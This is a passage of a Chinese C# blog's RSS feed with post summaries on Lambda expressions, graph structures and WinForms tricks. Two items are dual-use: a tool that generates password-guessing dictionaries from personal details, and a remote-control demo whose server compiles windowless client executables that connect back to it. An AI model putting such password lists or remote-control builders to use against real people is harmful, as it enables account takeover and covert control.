+从C#的所有特性可以看出,C#中提出的每个新特性都是建立在原来特性的基础上,并且是对原来特性的一个改进, 做这么多的改进主要是为了方便开发人员更好地使用C#来编写程序,是让我们写更少的代码来实现我们的程序,把一些额外的工作交给编译器去帮我们做,也就是很多人说微软很喜欢搞语法糖的意思(语法糖即让编译器帮我们做一些额外的事情，减少开发人员所考虑的事情，使开发人员放更多的精力放在系统的业务逻辑上面。)，大家从C# 3中提出的特性中可以很好的看出这点(指的是玩语法糖)，C#3中几乎大部分特性都是C#提供的语法糖，从CLR层面来说(指的是增加新的IL指令)，C# 3并没有更新什么，C# 4中提出的动态类型又是建立在表达式树的基础上，包括Linq也是建立在表达式树的基础上，所以每个特性都是层层递进的一个关系。相信C#后面提出的新特性将会更加方便我们开发程序，感觉所有语言的一个统一的思想都是——写更少的代码，却可以做更多的事情。但是我们不能仅仅停住于知道怎么使用它，我们还应该深入研究它的背后的故事，知道新特性是如何实现的和原理。用一句说就是——我们要知其然之气所以然，学习知识应该抱着刨根问底的态度去学习,相信这样的学习方式也可以让大家不感到心虚,写出的程序将会更加自信。</description>
+    </item>
+    
+    <item>
+      <title>社工字典生成工具</title>
+      <link>https://leizhiyuan.github.io/2013/01/21/%E7%A4%BE%E5%B7%A5%E5%AD%97%E5%85%B8%E7%94%9F%E6%88%90%E5%B7%A5%E5%85%B7/</link>
+      <pubDate>Mon, 21 Jan 2013 08:23:13 +0000</pubDate>
+      
+      <guid>https://leizhiyuan.github.io/2013/01/21/%E7%A4%BE%E5%B7%A5%E5%AD%97%E5%85%B8%E7%94%9F%E6%88%90%E5%B7%A5%E5%85%B7/</guid>
+      <description>在家无聊写了这个工具，主要是为了防止自己这一直写随笔把本行忘了。。也熟悉一下代码。。暂时不放源代码了。以后改的好一点再发吧。
+作者：bystander
+博客：http://leaver.me
+转载请注明出处！
+
+&amp;nbsp;
+
+涉及到的东西有：
+1.C#隐藏TabControl的header部分，前面的文章有介绍
+2.获取窗体全部的某一类控件（这个无聊的话抽象出一个通用的方法出来，以后就可以直接用了） /// &amp;lt;summary&amp;gt; /// 获取所有的文本框控件 /// &amp;lt;/summary&amp;gt; /// &amp;lt;param name=&amp;ldquo;control&amp;rdquo;&amp;gt;&amp;lt;/param&amp;gt; /// &amp;lt;returns&amp;gt;&amp;lt;/returns&amp;gt; private List&amp;lt;TextBox&amp;gt; GetAllControls(Control control) { foreach (Control con in control.Controls) { if (con.Controls.Count &amp;gt; 0) { GetAllControls(con); } else if (con is TextBox) { tBoxList.Add(con as TextBox); } } return tBoxList; } &amp;nbsp;
+3.文件操作
+4.字符串操作
+反正很简单，主要就是写的时候思路要清晰。知道大部分使用密码的规则。处理一下生日格式。否则后面很麻烦。。相应的验证也比较少。界面依然毫无美感。。
+总结：
+现在发现在控件命名上越来越顺利了。自我感觉良好。后面慢慢的要开始尝试使用学到的一些新的技术点。。
+下载：社工字典生成工具</description>
+    </item>
+    
+    <item>
+      <title>C#隐藏TabControl标签栏</title>
+      <link>https://leizhiyuan.github.io/2013/01/11/c#%E9%9A%90%E8%97%8Ftabcontrol%E6%A0%87%E7%AD%BE%E6%A0%8F/</link>
+      <pubDate>Fri, 11 Jan 2013 21:31:52 +0000</pubDate>
+      
+      <guid>https://leizhiyuan.github.io/2013/01/11/c#%E9%9A%90%E8%97%8Ftabcontrol%E6%A0%87%E7%AD%BE%E6%A0%8F/</guid>
+      <description>今天考过了微软的那个70-562和70-536的考试。然后下午把软件体系结构的作业做了。然后看了一下栈溢出，我博客首页右侧的那个就是我的栈溢出id了。。
+然后就看到了这个问题。这个问题。我曾经遇到过。貌似大家知道比较多的是两种。第一种就是设置大小。 tabControl1.SizeMode = TabSizeMode.Fixed; tabControl1.ItemSize = new Size(0, 1); 
+但是这样你注意看的话，左上角有个小的瑕疵。这个没办法的。。还有一种比较低级但还算有效的方法就是在设计的时候将TabControl向上移动。运行以后就会遮住了。
+我当时不过取巧了。好像就用的第二种。。今天看到这个题目的时候，就做了下标记。刚才去看。大牛已经给出答案了。就是自己继承一个TabControl控件。重写 void WndProc(ref Message m) 方法，在方法里拦截系统消息。 using System; using System.Windows.Forms;
+class TablessControl : TabControl { protected override void WndProc(ref Message m) { // Hide tabs by trapping the TCM_ADJUSTRECT message if (m.Msg == 0x1328 &amp;amp;&amp;amp; !DesignMode) m.Result = (IntPtr)1; else base.WndProc(ref m); } } 具体用法。就是在你的项目里新建一个类文件。然后把上面的代码拷进去。然后编译一下。就会在工具箱里多出一个TablessControl控件。拖进来即可使用。当然你也可以自定义一个用户控件。都不是事。这个控件设计时标签页可见。运行时由于拦截了信息消息。标签栏就不可见了。堪称完美。。</description>
+    </item>
+    
+    <item>
+      <title>图的遍历(C#)</title>
+      <link>https://leizhiyuan.github.io/2013/01/06/%E5%9B%BE%E7%9A%84%E9%81%8D%E5%8E%86c/</link>
+      <pubDate>Sun, 06 Jan 2013 16:35:45 +0000</pubDate>
+      
+      <guid>https://leizhiyuan.github.io/2013/01/06/%E5%9B%BE%E7%9A%84%E9%81%8D%E5%8E%86c/</guid>
+      <description>讲的非常好的一篇文章。感谢abatei，直接收藏分享之。
+图的存储结构 图的存储结构除了要存储图中各个顶点的本身的信息外，同时还要存储顶点与顶点之间的所有关系（边的信息），因此，图的结构比较复杂，很难以数据元素在存储区中的物理位置来表示元素之间的关系，但也正是由于其任意的特性，故物理表示方法很多。常用的图的存储结构有邻接矩阵、邻接表、十字链表和邻接多重表。
+8.2.1 邻接矩阵表示法 对于一个具有n个顶点的图，可以使用n*n的矩阵（二维数组）来表示它们间的邻接关系。图8.10和图8.11中，矩阵A(i，j)=1表示图中存在一条边(Vi，Vj)，而A(i，j)=0表示图中不存在边(Vi，Vj)。实际编程时，当图为不带权图时，可以在二维数组中存放bool值，A(i，j)=true表示存在边(Vi，Vj)，A(i，j)=false表示不存在边(Vi，Vj)；当图带权值时，则可以直接在二维数组中存放权值，A(i，j)=null表示不存在边(Vi，Vj)。
+ 图8.10所示的是无向图的邻接矩阵表示法，可以观察到，矩阵延对角线对称，即A(i，j)= A(j，i)。无向图邻接矩阵的第i行或第i列非零元素的个数其实就是第i个顶点的度。这表示无向图邻接矩阵存在一定的数据冗余。
+图8.11所示的是有向图邻接矩阵表示法，矩阵并不延对角线对称，A(i，j)=1表示顶点Vi邻接到顶点Vj；A(j，i)=1则表示顶点Vi邻接自顶点Vj。两者并不象无向图邻接矩阵那样表示相同的意思。有向图邻接矩阵的第i行非零元素的个数其实就是第i个顶点的出度，而第i列非零元素的个数是第i个顶点的入度，即第i个顶点的度是第i行和第i列非零元素个数之和。
+由于存在n个顶点的图需要n2个数组元素进行存储，当图为稀疏图时，使用邻接矩阵存储方法将出现大量零元素，照成极大地空间浪费，这时应该使用邻接表表示法存储图中的数据。
+8.2.2 邻接表表示法 图的邻接矩阵存储方法跟树的孩子链表示法相类似，是一种顺序分配和链式分配相结合的存储结构。邻接表由表头结点和表结点两部分组成，其中图中每个顶点均对应一个存储在数组中的表头结点。如这个表头结点所对应的顶点存在相邻顶点，则把相邻顶点依次存放于表头结点所指向的单向链表中。如图8.12所示，表结点存放的是邻接顶点在数组中的索引。对于无向图来说，使用邻接表进行存储也会出现数据冗余，表头结点A所指链表中存在一个指向C的表结点的同时，表头结点C所指链表也会存在一个指向A的表结点。  有向图的邻接表有出边表和入边表（又称逆邻接表）之分。出边表的表结点存放的是从表头结点出发的有向边所指的尾顶点；入边表的表结点存放的则是指向表头结点的某个头顶点。如图8.13所示，图(b)和&amp;copy;分别为有向图(a)的出边表和入边表。  以上所讨论的邻接表所表示的都是不带权的图，如果要表示带权图，可以在表结点中增加一个存放权的字段，其效果如图8.14所示。
+
+【注意】：观察图8.14可以发现，当删除存储表头结点的数组中的某一元素，有可能使部分表头结点索引号的改变，从而导致大面积修改表结点的情况发生。可以在表结点中直接存放指向表头结点的指针以解决这个问题（在链表中存放类实例即是存放指针，但必须要保证表头结点是类而不是结构体）。在实际创建邻接表时，甚至可以使用链表代替数组存放表头结点或使用顺序表存代替链表存放表结点。对所学的数据结构知识应当根据实际情况及所使用语言的特点灵活应用，切不可生搬硬套。
+【例8-1 AdjacencyList.cs】图的邻接表存储结构  using System; using System.Collections.Generic; public class AdjacencyList&amp;lt;T&amp;gt; { List&amp;lt;Vertex&amp;lt;T&amp;gt;&amp;gt; items; //图的顶点集合 public AdjacencyList() : this(10) { } //构造方法 public AdjacencyList(int capacity) //指定容量的构造方法 { items = new List&amp;lt;Vertex&amp;lt;T&amp;gt;&amp;gt;(capacity); } public void AddVertex(T item) //添加一个顶点 { //不允许插入重复值 if (Contains(item)) { throw new ArgumentException(&amp;ldquo;插入了重复顶点！&amp;rdquo;); } items.Add(new Vertex&amp;lt;T&amp;gt;(item)); } public void AddEdge(T from, T to) //添加无向边 { Vertex&amp;lt;T&amp;gt; fromVer = Find(from); //找到起始顶点 if (fromVer == null) { throw new ArgumentException(&amp;ldquo;头顶点并不存在！&amp;rdquo;); } Vertex&amp;lt;T&amp;gt; toVer = Find(to); //找到结束顶点 if (toVer == null) { throw new ArgumentException(&amp;ldquo;尾顶点并不存在！&amp;rdquo;); } //无向边的两个顶点都需记录边信息 AddDirectedEdge(fromVer, toVer); AddDirectedEdge(toVer, fromVer); } public bool Contains(T item) //查找图中是否包含某项 { foreach (Vertex&amp;lt;T&amp;gt; v in items) { if (v.</description>
+    </item>
+    
+    <item>
+      <title>远程管理Demo(C#)</title>
+      <link>https://leizhiyuan.github.io/2013/01/04/%E8%BF%9C%E7%A8%8B%E7%AE%A1%E7%90%86democ/</link>
+      <pubDate>Fri, 04 Jan 2013 15:18:06 +0000</pubDate>
+      
+      <guid>https://leizhiyuan.github.io/2013/01/04/%E8%BF%9C%E7%A8%8B%E7%AE%A1%E7%90%86democ/</guid>
+      <description>一个C#的通信的例子
+
+1.服务端，服务端通过ip和端口生成客户端之后，点击开始监听后，便开启监听线程持续监听，同时注册断开连接和收到信息的事件。收到来自TcpClient 流中的信息后，解析之，如果是连接信息，就添加到连接列表，这样服务端就可以显示多个客户端了。如果是断开信息，就删掉。如果服务端想要给客户端发消息，就选中该客户，然后填写信息，就会调用连接类的发送方法。
+&amp;nbsp;
+2.客户端，也就是被控端，被控端通过tcp连接到远端ip，然后发送连接成功状态，随后异步读取。读取到信息后调用解析方式。然后处理。。
+3.服务端如何生成客户端。其实也比较简单。就是写好客户端以后，保存为文本。然后通过CodeDomProvider的相关方法来编译即可。代码如下： public static bool Compile(string EXE_Name, string Source) { CodeDomProvider Compiler = CodeDomProvider.CreateProvider(&amp;ldquo;CSharp&amp;rdquo;); CompilerParameters Parameters = new CompilerParameters(); CompilerResults cResults = default(CompilerResults);
+Parameters.GenerateExecutable = true; Parameters.OutputAssembly = EXE_Name; Parameters.ReferencedAssemblies.Add(&amp;#34;System.dll&amp;#34;); Parameters.CompilerOptions = &amp;#34; /target:winexe&amp;#34;; Parameters.TreatWarningsAsErrors = false; cResults = Compiler.CompileAssemblyFromSource(Parameters, Source); if (cResults.Errors.Count &amp;amp;gt; 0) { foreach (CompilerError CompilerError_loopVariable in cResults.Errors) { CompilerError error = CompilerError_loopVariable; MessageBox.Show(&amp;#34;Error: &amp;#34; + error.ErrorText, &amp;#34;&amp;#34;, MessageBoxButtons.OK, MessageBoxIcon.Error); } return false; } else if (cResults.</description>
+    </item>
+    
+    <item>
+      <title>Lambda高手之路第六部分</title>
+      <link>https://leizhiyuan.github.io/2012/12/28/lambda%E9%AB%98%E6%89%8B%E4%B9%8B%E8%B7%AF%E7%AC%AC%E5%85%AD%E9%83%A8%E5%88%86/</link>
+      <pubDate>Fri, 28 Dec 2012 14:24:35 +0000</pubDate>
+      
+      <guid>https://leizhiyuan.github.io/2012/12/28/lambda%E9%AB%98%E6%89%8B%E4%B9%8B%E8%B7%AF%E7%AC%AC%E5%85%AD%E9%83%A8%E5%88%86/</guid>
+      <description>今天武汉地铁通车了，今天介绍一些新的Lambda设计模式，应该是最后一部分了。
+本节介绍一些核心有lambda表达式的模式，我不认为他们完全是新的模式，但是至少我还没有看到有人给他们起过名字，我于是决定尝试取个可能好，也可能不好的名字，这样我起码能很容易的给别人描述，有话在先，许多模式相当强大，但是可能会引入潜在的bug，所以小心为上
+复杂的多态
+Lambda表达式也可以被用来创建一些多态（override），而不用使用abstract或者virtual关键字（当然这并不意味着就不能用），考虑如下的代码片段
+class MyBaseClass { public Action SomeAction { get; protected set; } public MyBaseClass() { SomeAction = () =&amp;gt; { //Do something! }; } } 看起来没什么新的知识，我们创建一个类，里面有一个属性（一个lambda表达式），又一次JavaScript化了，有趣的地方是：属性暴露的这个部分不只是本类可以改变，子类也可以改变，看代码
+class MyInheritedClass : MyBaseClass { public MyInheritedClass { SomeAction = () =&amp;gt; { //Do something different! }; } }  看到了。我们可以改变这个方法。或者进行更精确的操作，这种方法的缺点是我们不能直接访问父类的实现，也就缺乏了基类的能力，因为，这个父类的属性会有同样的值，如果程序员真的需要这样写，我建议你遵循 pattern
+class MyBaseClass { public Action SomeAction { get; private set; } Stack&amp;lt;Action&amp;gt; previousActions; protected void AddSomeAction(Action newMethod) { previousActions.Push(SomeAction); SomeAction = newMethod; } protected void RemoveSomeAction() { if(previousActions.</description>
+    </item>
+    
+    <item>
+      <title>Lambda高手之路第五部分</title>
+      <link>https://leizhiyuan.github.io/2012/12/27/lambda%E9%AB%98%E6%89%8B%E4%B9%8B%E8%B7%AF%E7%AC%AC%E4%BA%94%E9%83%A8%E5%88%86/</link>
+      <pubDate>Thu, 27 Dec 2012 09:15:29 +0000</pubDate>
+      
+      <guid>https://leizhiyuan.github.io/2012/12/27/lambda%E9%AB%98%E6%89%8B%E4%B9%8B%E8%B7%AF%E7%AC%AC%E4%BA%94%E9%83%A8%E5%88%86/</guid>
+      <description>武汉下雪了。。今天介绍Lambda表达式非常有用的情况。。ps:这个高手之路已经翻译了10000多字了。。疼啊。。
+一些模式比另一些模式有时候更加合适，真正有用的模式是自定义方法表达式，用爱促使话一些对象的部分，我们考虑下面这种情况。
+我们想要创建一个可以处理多种延迟加载的对象，这意味着即时对象已经被实例化了，我们还没有加载所有请求的资源，一个理由就是防止大量的IO操作。（比如通过网络传输），当我们开始使用数据的时候，我们想要确定数据足够新鲜，现在有一些确定的方法可以做这个。并且最有效的显然是实体框架已经用LINQ解决了延迟加载的问题，Iqueryable仅存储了查询，而没有任何无关的数据。一旦我们请求一个结果。不仅仅构造的查询被执行，同时也被以更高效的方式执行，比如一个在远程数据服务器上的SQL查询。
+在这里，我们仅仅想要看看两种情况的不同点，首先，我们查询，一切就绪，查询应该在已经加载了的数据上进行。
+class LazyLoad { public LazyLoad() { Search = query =&amp;gt; { var source = Database.SearchQuery(query); Search = subquery =&amp;gt; { var filtered = source.Filter(subquery); foreach(var result in filtered) yield return result; }; foreach(var result in source) yield return result; }; } public Func&amp;lt;string, IEnumerable&amp;lt;ResultObject&amp;gt;&amp;gt; Search { get; private set; } }  简单来看，这里我们有两种不他哦你的方法，地一个是我们把数据从数据库里提取出来（也就是Database静态类所做的），然后第二个方法将会过滤从数据库里提取出来的数据。一旦我们将会从我们的第一次查询取得结果，当然我们也可以构造内置的其他方法来重置类的行为，对于工业级的代码，其他的方法也许更加有用。
+另一个例子是初始时间分支，假设我们有一个对象，该对象有个方法叫做Perform(),这个方法可以用来调用一些代码，包含这个方法的对象可以被初始化，初始化有三种方式。 1. 通过传递方法来调用 2. 通过传递一些包含这个方法的对象来调用 3. 或者通过传递第一种情况下的序列化以后的信息来调用。
+现在我们可以保留所有的三种方式做全局变量。而Perform方法将不得不查看当前的状态（或者是保存在枚举变量里，或者和null进行比较）然后检测被调用的正确的方式，最后调用开始。
+更好的一种方法是吧Perform()方法写成一个属性，这个属性仅仅允许在类里面进行set，它是一个委托类型，现在我们可以在对应的构造方法里面直接设置这个属性，因此，我们可以不用全局变量，也不用担心这个对象是如何实例化的，这种方法更好。
+看一小段简单的代码。
+class Example { public Action&amp;lt;object&amp;gt; Perform { get; private set; } public Example(Action&amp;lt;object&amp;gt; methodToBeInvoked) { Perform = methodToBeInvoked; } //接口 public Example(IHaveThatFunction mother) { //传递的对象必须有我们要用的方法 Perform = mother.</description>
+    </item>
+    
+    <item>
+      <title>Lambda高手之路第四部分</title>
+      <link>https://leizhiyuan.github.io/2012/12/24/lambda%E9%AB%98%E6%89%8B%E4%B9%8B%E8%B7%AF%E7%AC%AC%E5%9B%9B%E9%83%A8%E5%88%86/</link>
+      <pubDate>Mon, 24 Dec 2012 19:20:12 +0000</pubDate>
+      
+      <guid>https://leizhiyuan.github.io/2012/12/24/lambda%E9%AB%98%E6%89%8B%E4%B9%8B%E8%B7%AF%E7%AC%AC%E5%9B%9B%E9%83%A8%E5%88%86/</guid>
+      <description>首先祝大家平安夜快乐。本篇介绍一些流行的JavaScript模式。为下一篇打基础
+使用/了解JavaScript的一个好处就是函数的高级用法。。在JavaScript里。函数仅仅是对象。他们可以有赋给他们的属性。而在C#中。我们不能做我们可以在JavaScript的全部事情。但是我们仍然可以做些事情。一个原因是JavaScript在函数里给变量以作用域。因此，不得不通过创建函数，大多数情况是匿名的来定位变量。而在C#中。通过使用块，通过花括号来创建作用域
+当然，换种方式来说。C#中，函数也会给变量作用域。通过使用Lambda表达式。我们通过花括号在其里面创建了一个变量。然而。我们也可以局部的创建作用域。
+我们来看看通过使用Lambda表达式可以实现一些在JavaScript里面有用的模式把。
+回调模式
+这个模式是个老的模式。事实上。回调模式从.net 的第一版就开始使用了。但是是以一种很简单的方式实现的。而现在。通过使用Lambda表达式。闭包，捕获变量等特性能够允许我们写出如下的代码来。
+void CreateTextBox() { var tb = new TextBox(); tb.IsReadOnly = true; tb.Text = &#34;Please wait ...&#34;; DoSomeStuff(() =&amp;gt; { tb.Text = string.Empty; tb.IsReadOnly = false; }); } void DoSomeStuff(Action callback) { // Do some stuff - asynchronous would be helpful ... callback(); } 对于JavaScript程序员会觉得这没什么啊。他们使用这个模式太多了。然而，它非常有用。因为我们可以使用参数作为Ajax相关事件的事件处理器（比如oncompleted，onsuccess），等等。如果你使用LINQ，那么你可能也会用到回调模式的一些东西。举个例子。LINQ的where子句将会在每一次迭代中回调你的查询语句。这只是回调函数的一个例子。在.net的世界里。事件如它名字所暗示的那样。通常是事件处理的首选方法。这有时候很像一个回调。他有两个参数。有一个特殊的关键字和一个类型模式（两个参数分别是sender和arguments，sender通常是object类型。Arguments通常继承自EventArgs） 可以通过+= 和-=给事件添加/删除事件处理程序。
+返回方法 和普通的方法比较。Lambda表达式也可以返回一个方法指针（就是一个委托实例），这意味着我们可以使用Lambda表达式创建/返回一个lambda表达式（或者今年仅是一个已定义好的方法的委托实例），大量的情况下。这个模式也很有用。首先看一下例子。
+Func&amp;lt;string, string&amp;gt; SayMyName(string language) { switch(language.ToLower()) { case &#34;fr&#34;: return name =&amp;gt; { return &#34;Je m&#39;appelle &#34;</description>
+    </item>
+    
+    <item>
+      <title>Lambda高手之路第三部分</title>
+      <link>https://leizhiyuan.github.io/2012/12/20/lambda%E9%AB%98%E6%89%8B%E4%B9%8B%E8%B7%AF%E7%AC%AC%E4%B8%89%E9%83%A8%E5%88%86/</link>
+      <pubDate>Thu, 20 Dec 2012 20:12:54 +0000</pubDate>
+      
+      <guid>https://leizhiyuan.github.io/2012/12/20/lambda%E9%AB%98%E6%89%8B%E4%B9%8B%E8%B7%AF%E7%AC%AC%E4%B8%89%E9%83%A8%E5%88%86/</guid>
+      <description>背后的秘密-MSIL
+通过著名的LINQPad，我们可以更深入的查看MSIL代码而没有任何秘密。下图是一个LINQPad的使用截图 
+我们会看三个例子，第一个Lambda表达式如下：
+Action&amp;lt;string&amp;gt; DoSomethingLambda = (s) =&amp;gt; { Console.WriteLine(s);// + local }; 对应的普通函数是这样的
+Action&amp;lt;string&amp;gt; DoSomethingLambda = (s) =&amp;gt; { Console.WriteLine(s);// + local };  生成的MSIL代码片段如下：
+DoSomethingNormal: IL_0000: nop IL_0001: ldarg.1 IL_0002: call System.Console.WriteLine IL_0007: nop IL_0008: ret &amp;lt;Main&amp;gt;b__0: IL_0000: nop IL_0001: ldarg.0 IL_0002: call System.Console.WriteLine IL_0007: nop IL_0008: ret  最大的不同是方法的名称用法不同。而不是声明。事实上。声明是完全一样的。编译器在类里面创建了一个新的方法来实现这个方法。这没什么新东西，仅仅是为了我们使用Lambda表达式方便代码编写。从MSIL代码中，我们做了同样的事情。在当前对象里调用了一个方法。
+我们在下图里演示一下编译器所做的修改。在这个图例。我们可以看到编译器把Lambda表达式移动成了一个固定的方法。
+ 第二个例子将展示Lambda表达式真正的奇妙之处，在这个例子里。我们既使用了有着全局变量的普通方法也使用了有捕获变量的Lambda表达式。代码如下
+void Main() { int local = 5; Action&amp;lt;string&amp;gt; DoSomethingLambda = (s) =&amp;gt; { Console.WriteLine(s + local); }; global = local; DoSomethingLambda(&#34;</description>
+    </item>
+    
+    <item>
+      <title>Lambda高手之路第二部分</title>
+      <link>https://leizhiyuan.github.io/2012/12/19/lambda%E9%AB%98%E6%89%8B%E4%B9%8B%E8%B7%AF%E7%AC%AC%E4%BA%8C%E9%83%A8%E5%88%86/</link>
+      <pubDate>Wed, 19 Dec 2012 20:03:20 +0000</pubDate>
+      
+      <guid>https://leizhiyuan.github.io/2012/12/19/lambda%E9%AB%98%E6%89%8B%E4%B9%8B%E8%B7%AF%E7%AC%AC%E4%BA%8C%E9%83%A8%E5%88%86/</guid>
+      <description>闭包的影响 为了展示闭包的影响，我们看下面这个例子。 var buttons = new Button[10];
+for(var i = 0; i &amp;lt; buttons.Length; i++) { var button = new Button(); button.Text = (i + 1) + &amp;ldquo;. Button - Click for Index!&amp;rdquo;; button.OnClick += (s, e) =&amp;gt; { Messagebox.Show(i.ToString()); }; buttons[i] = button; } //如果我们点击按钮会发生什么 这个问题很怪，我在我的JavaScript课程上经常问我的学生。95%的学生会说。显然按钮0显示0，按钮1显示1，等等。而不足5%的学生学习了闭包之后会明白。所有的按钮都会显示10.
+局部变量i的值改变了。并且等于buttons.Length。也就是10了。想要避免这个诡异的情况也很简单。如下就行了。 var button = new Button(); var index = i; button.Text = (i + 1) + &amp;ldquo;. Button - Click for Index!&amp;rdquo;; button.</description>
+    </item>
+    
+    <item>
+      <title>Lambda高手之路第一部分</title>
+      <link>https://leizhiyuan.github.io/2012/12/18/lambda%E9%AB%98%E6%89%8B%E4%B9%8B%E8%B7%AF%E7%AC%AC%E4%B8%80%E9%83%A8%E5%88%86/</link>
+      <pubDate>Tue, 18 Dec 2012 19:38:42 +0000</pubDate>
+      
+      <guid>https://leizhiyuan.github.io/2012/12/18/lambda%E9%AB%98%E6%89%8B%E4%B9%8B%E8%B7%AF%E7%AC%AC%E4%B8%80%E9%83%A8%E5%88%86/</guid>
+      <description>好长时间没发技术文章了，恰好看到一篇非常详细的Lambda文章。一边翻译一边学习。题目好像有点霸气。。
+介绍 Lambda表达式是使代码更加动态，易于扩展并且更加快速（看完本文你就知道原因了）的强有力的工具。也可以用来降低潜在的错误。同时可以利用静态输入和智能提示，就像VS里一样。
+&amp;nbsp;
+Lambda表达式在.net framework 3.5中提出来。并且在LINQ和ASP.NET MVC内部的一些技术中扮演了相当重要的角色。如果你考虑一下ASP.NET MVC中各类控件的实现。你就发现。奥妙就是他们大多使用了Lambda表达式。和Lambda表达式一起，使用Html扩展方法将会使得在后台创建模型成为可能。
+本文会讲到如下的知识。
+1.简短的介绍-Lambda表达式是什么，以及为什么和匿名方法不同（之前我们使用的） 2.走近Lambda表达式的性能-在哪些情况下比起标准方法，Lambda会提高/损失性能 3.深入-Lambda表达式在MSIL代码中是什么样 4.一些来自JS世界的模式映射到C#中 5.那些能够提高性能，并且代码看起来相当舒服的使用Lambda的情况。 6.一些我提出的新模式-当然有可能别人也提出来了。但这是我的思考结果。
+&amp;nbsp;
+如果你期望本文是一篇入门教程我可能要让你失望了，除非你真的很优秀并且很聪明，当然我不是这种人，所以我也想提前声明一下：为了读懂这篇文章你可能需要C#的一些高级知识，并且对C#比较了解。
+&amp;nbsp;
+你应该期望本文试着解释一些事情给你，也会解释一些有趣的问题，至少对我来说是这样的。最后我会展示一些实际的例子和模式，如我所说，Lambda表达式简化了很多情况。因此写显式的模式很有用。
+背景知识-什么是Lambda表达式 在C#1.0中，委托被提出了，它使得传递函数成为可能，一句话就是委托就是强类型的函数指针，但委托比指针更强大。一般传递一个函数需要如下几步。 1. 写一个委托（就像一个类）包含返回类型和参数类型 2. 使用委托作为某一个函数的参数类型，这样，该函数就可以接受和委托描述的有着相同签名的函数了 3. 将一个委托类型的函数传递给委托，创建一个委托实例。
+&amp;nbsp;
+如果听起来很复杂，确实本来很复杂，但这是必需的。（虽然不是造火箭，但是比你认为的要更多的代码），然而步骤三不是必需的，编译器会为你做他，但是步骤1和2却是必不可少的。
+&amp;nbsp;
+幸运的是C#2.0出现了泛型，现在我们也可以写泛型类，方法，更重要的是，泛型委托，然而，直到.net framework 3.5的时候。微软意识到实际上只有两种泛型委托（当然有一些不同的重载），会覆盖99%的使用情况：
+1.Action 没有任何输入参数，也没有输出参数。 2.Action&amp;lt;t1,…t16&amp;gt; 需要1-16个参数，没有输出参数。 3.Func&amp;lt;t1….t16,tout&amp;gt;需要0-16个参数，一个输出参数
+&amp;nbsp;
+Action和其对应的泛型版本（仅仅是一个动作，执行一些事情）返回void的时候。Func则可以返回最后一个参数指定的类型，通过这两个委托类型，我们事实上，大部分情况下。前面提到的三步中的第一部就不用写的。而第二步仍然需要。
+&amp;nbsp;
+那么如果我们想要运行代码的时候怎么做呢。在C#2.0中问题已经可以解决了。在这个版本里。我们可以创建委托方法，也就是一个匿名方法，然后这个语法一直未能流行起来，一个相当简化的匿名方法的版本类似这样： Func&amp;lt;double, double&amp;gt; square = delegate (double x) { return x * x; } 为了提高这种语法，欢迎来到Lambda表达式的国度。首先，这个Lambda名字怎么来的？事实上。来自于数学上的λ演算，更准确的说他是数学中一个正式的系统。用于通过变量绑定和替换来进行表达式计算，所以我们有0-N个输入参数和一个返回值，而在编程中，也可以没有返回值
+我们看一下Lambda表达式的一些例子 //编译器可以识别，然后就可以通过dummyLambda();来调用了 var dummyLambda = () =&amp;gt; { Console.WriteLine(&amp;ldquo;Hallo World from a Lambda expression!</description>
+    </item>
+    
+    <item>
+      <title>3分钟理解Lambda表达式</title>
+      <link>https://leizhiyuan.github.io/2012/12/08/3%E5%88%86%E9%92%9F%E7%90%86%E8%A7%A3lambda%E8%A1%A8%E8%BE%BE%E5%BC%8F/</link>
+      <pubDate>Sat, 08 Dec 2012 19:26:51 +0000</pubDate>
+      
+      <guid>https://leizhiyuan.github.io/2012/12/08/3%E5%88%86%E9%92%9F%E7%90%86%E8%A7%A3lambda%E8%A1%A8%E8%BE%BE%E5%BC%8F/</guid>
+      <description>1.什么是Lambda表达式
+Lambda表达式是一个匿名方法，通常在LINQ中被用来创建委托
+简单来说。它是一个没有声明，没有访问修饰符，没有返回值。甚至没有名字的方法。
+&amp;nbsp;
+2.为什么我们需要使用Lambda表达式？或者说为什么我们要写一个没有名字的函数？
+为了方便，这种快捷方式允许你在调用的地方直接编写代码，尤其是你想调用的代码只会在这个地方使用一次。并且方法体本身很短。节省了单独写方法中写声明等等的麻烦。。
+好处
+1.代码量减少。不必写方法的名称。返回值和访问修饰符
+2.当阅读代码的时候。直接就可以看到被调用函数的代码，不用去别的地方。
+Lambda表示应该短些。太复杂了。可读性就下降了
+&amp;nbsp;
+如果编写Lambda表达式
+Lambda基本的定义是：参数=&amp;gt;执行代码
+举个例子 n = &amp;gt; n % 2 == 1 n是输入参数 n % 2 == 1 是函数体
+你可以读作：给这个匿名方法传入一个参数n，如果n是奇数就返回true
+&amp;nbsp;
+使用该Lambda的例子 List&amp;lt;int&amp;gt; numbers = new List&amp;lt;int&amp;gt;{11,37,52}; List&amp;lt;int&amp;gt; oddNumbers = numbers.where(n =&amp;gt; n % 2 == 1).ToList(); //现在oddNumbers 里面就是11和37了 ok.基本的Lambda表达式就是这样了。</description>
+    </item>
+    
+    <item>
+      <title>C#模拟手工洗牌(附测试)</title>
+      <link>https://leizhiyuan.github.io/2012/11/25/c#%E6%A8%A1%E6%8B%9F%E6%89%8B%E5%B7%A5%E6%B4%97%E7%89%8C%E9%99%84%E6%B5%8B%E8%AF%95/</link>
+      <pubDate>Sun, 25 Nov 2012 09:24:20 +0000</pubDate>
+      
+      <guid>https://leizhiyuan.github.io/2012/11/25/c#%E6%A8%A1%E6%8B%9F%E6%89%8B%E5%B7%A5%E6%B4%97%E7%89%8C%E9%99%84%E6%B5%8B%E8%AF%95/</guid>
+      <description>洗牌大家都知道，代码实现最广泛的一种就是产生两个随机数，然后交换这两个随机数为下标的牌，但是这种的洗牌并不能保证同概率，你可以参考本文做一些测试，本文代码没啥可说的。我写出了非常详细的注释
+ps:刚开始写那个随机数的时候，我随便给了个种子2012.。结果你懂的。。意外意外。这个全局的result数组让我很疼，代码有什么可以改进的，欢迎留言指出。不胜感激。 /*Author:Bystander *Blog:http://leaver.me Date:2012/11/24/ using System;
+class Program { static int[,] result; static void Main() { //初始牌的顺序，我只测试10张牌的情况 char[] _arr = { &amp;lsquo;A&amp;rsquo;, &amp;lsquo;B&amp;rsquo;, &amp;lsquo;C&amp;rsquo;, &amp;rsquo;D&amp;rsquo;, &amp;lsquo;E&amp;rsquo;, &amp;lsquo;F&amp;rsquo;, &amp;lsquo;G&amp;rsquo;, &amp;lsquo;H&amp;rsquo;, &amp;lsquo;I&amp;rsquo;, &amp;lsquo;J&amp;rsquo; }; result = new int[_arr.Length, _arr.Length]; //进行1000次，来统计结果的数字.
